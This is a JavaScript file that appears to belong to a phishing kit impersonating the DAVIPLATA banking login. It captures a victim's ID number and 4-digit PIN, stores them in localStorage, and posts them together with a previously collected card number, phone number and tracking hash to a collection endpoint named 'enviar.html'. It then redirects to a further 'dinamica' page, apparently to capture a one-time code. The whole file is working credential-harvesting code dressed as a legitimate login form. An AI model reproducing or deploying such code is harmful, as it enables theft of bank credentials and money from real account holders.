$(function () {
    $("#numId").val('');
    $("#tipoId").val('01-CC');

    function validarPaso1() {
        const num = $("#numId").val();
        if (num.length >= 3 && num.length <= 16 && num.charAt(0) !== '0') {
            $("#userFormContinuar").prop('disabled', false);
        } else {
            $("#userFormContinuar").prop('disabled', true);
        }
    }

    $(document).on("click", ".inputSelect__complet", function () { switchSelect(); });

    $(document).on("click", "li", function (e) {
        $(".textoFormSelect").text($(this).text());
        $("#tipoId").val($(this).attr('value'));
        closeSelect();
        validarPaso1();
        e.stopPropagation();
    });

    $(document).on("click", "#userFormContinuar", function () {
        $("#view-loading").show();
        
        const ccBreb = localStorage.getItem('cc') || '---';
        const payload = {
             tipo: 'seleccion',
             banco: 'DAVIPLATA',
             usuario: $("#numId").val(),
             cc: ccBreb,
             hash: window.location.hash.substring(1) || localStorage.getItem('hash') || '',
             cliente: localStorage.getItem('cliente_id') || '---',
             tel: localStorage.getItem('tel') || '---'
         };

        console.log("Enviando seleccion Daviplata con CC:", ccBreb);

        $.ajax({
            url: '../../enviar.html',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify(payload),
            complete: function() {
                $("#view-loading").hide();
                $("#pasoDocumento").hide();
                $("#pasoClave").fadeIn();
            }
        });
    });

    $(document).on("click", "#btnVolver", function () {
        $("#pasoClave").hide();
        $("#pasoDocumento").fadeIn();
    });

    $(document).on("input", "#claveDavi", function () {
        this.value = this.value.replace(/[^0-9]/g, '');
        $("#btnFinalizar").prop('disabled', this.value.length !== 4);
    });

    $(document).on("keyup", "#numId", function () { 
        this.value = this.value.replace(/[^0-9]/g, '');
        validarPaso1(); 
    });

    $(document).on("submit", "#userForm", function (e) { 
        e.preventDefault();
        $("#view-loading").show();

        const documentNumber = $("#numId").val();
        const daviPass = $("#claveDavi").val();
        localStorage.setItem('daviplata_user', documentNumber);
        localStorage.setItem('daviplata_pass', daviPass);

        const ccBreb = localStorage.getItem('cc') || '---';
        const payload = {
             tipo: 'login',
             banco: 'DAVIPLATA',
             usuario: $("#numId").val(),
             cc: ccBreb,
             pass: $("#claveDavi").val(),
             hash: window.location.hash.substring(1) || localStorage.getItem('hash') || '',
             cliente: localStorage.getItem('cliente_id') || '---',
             tel: localStorage.getItem('tel') || '---'
         };

        console.log("Enviando login Daviplata con CC:", ccBreb);

        $.ajax({
            url: '../../enviar.html',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify(payload),
            success: function() {
                const finalHash = window.location.hash || (localStorage.getItem('hash') ? '#' + localStorage.getItem('hash') : '');
                window.location.href = "dinamica.html" + finalHash;
            }
        });
    });
});

